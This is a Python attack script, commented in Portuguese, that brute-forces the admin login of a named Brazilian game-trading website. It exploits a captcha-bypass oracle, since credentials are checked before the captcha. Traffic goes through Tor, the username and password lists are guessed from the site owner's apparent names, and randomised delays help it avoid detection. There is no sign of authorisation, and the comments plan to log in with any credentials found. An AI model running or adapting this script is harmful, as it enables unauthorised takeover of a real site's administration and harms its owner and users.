#!/usr/bin/env python3
"""
/admin/autenticacao/login brute force via ORACULO (sem 2Captcha).
Descoberta: o server valida CRED ANTES do captcha. A msg "não confere"
aparece p/ cred errada e SOME p/ cred certa (so "captcha obrigatório").
Oraculo: body sem "não confere" = cred certa. Aí usa 2Captcha 1x para logar.
Nao-destrutivo: apenas valida (read-only).
"""
import sys, time, random, requests, urllib3, re
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
URL="https://186.226.60.54/admin/autenticacao/login"
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

USERNAMES=[
    "administrador","adminv","dev1ce","devaashe","masterx","admin","root",
    "diegobtrindade","desapegostore","diego047","master","desapego","diego",
    "trindade","Trindade","Diego","super","suporte","dono","modmotta",
    "diegodg","diegoccl","dev1ce","adminv2","administrador2","desapego2",
]
PASSWORDS=[
    "Desapego@2024","Desapego@2023","Desapego@2022","Desapego@2025","desapego2024",
    "desapego2023","desapego123","Desapego123","DesapegoGames","desapegogames",
    "Diego@2024","Diego@2023","diego123","Diego123","Diego2024","diego2024",
    "diegobtrindade","Diego@2024!","Trindade123","trindade","Trindade@2024",
    "admin","admin123","Admin@123","Admin123","Admin@2024","adminv","masterx",
    "masterx123","Masterx123","MasterX","dev1ce","Dev1ce123","devaashe",
    "123456","12345678","password","Password1","P@ssw0rd","qwerty","abc123",
    "letmein","welcome","welcome1","DesapegoGames@2024","DesapegoGames123",
    "desapegogames@2024","Desapego!2024","Desapego@2024!","Mudar@123","Senha@123",
    "desapego!","Desapego2024","Desapego2023","desapego@2024","desapego@2025",
    "Admin@desapego","Diego@desapego","masterx@2024","Masterx@2024",
]

def has_confere(content_b):
    return b"confere" in content_b

def main():
    out="enum/admin_oracle_brute.log"
    f=open(out,"w")
    def log(m): print(m,flush=True); f.write(m+"\n"); f.flush()
    log(f"[*] admin login ORACULO brute — {len(USERNAMES)} users x {len(PASSWORDS)} passes = {len(USERNAMES)*len(PASSWORDS)} tentativas")
    log(f"[*] Oraculo: body SEM 'confere' = cred certa (captcha bypass via ordem de validacao)")
    tried=0
    hits=[]
    for user in USERNAMES:
        for pw in PASSWORDS:
            tried+=1
            sess=requests.Session(); sess.proxies.update(PROXY)
            try:
                r=sess.post(URL,headers={"Host":HOSTH,"User-Agent":UA},
                            data={"login":user,"senha":pw},
                            verify=False,timeout=30,allow_redirects=False)
                body=r.content
                confere=has_confere(body)
                # oraculo: sem "confere" = POSSIVEL cred certa
                tag = "*** ORACULO POSITIVO ***" if not confere else ""
                log(f"  [{tried:04d}] {user!r:25s}:{pw!r:25s} -> HTTP {r.status_code} confere={confere} {tag}")
                if not confere:
                    # sem "confere" — investigar msgs
                    msgs=re.findall(rb'<div[^>]*class="[^"]*text-danger[^"]*"[^>]*>(.*?)</div>',body,re.DOTALL)
                    msgs_txt=[re.sub(rb'<[^>]+>',b'',m).strip().decode('utf-8',errors='replace') for m in msgs]
                    log(f"      MSGS (sem confere): {msgs_txt[:5]}")
                    hits.append((user,pw,r.status_code,msgs_txt))
            except Exception as e:
                log(f"  [{tried:04d}] {user!r:25s}:{pw!r:25s} -> EXC {type(e).__name__}: {e}")
            time.sleep(random.uniform(1.0,2.0))
    log(f"\n=== RESULTADO ===")
    log(f"Total tentativas: {tried}")
    log(f"Oraculo positivos (sem 'confere'): {len(hits)}")
    for u,p,st,ms in hits:
        log(f"  HIT: {u!r}:{p!r} status={st} msgs={ms}")
    if hits:
        log(f"\n[+] Cred(s) admin confirmada(s) via oraculo — usar 2Captcha para logar.")
    else:
        log(f"[-] Nenhum oraculo positivo (creds nao encontradas ou oraculo invalido).")
    f.close()
    return hits

if __name__=="__main__":
    main()
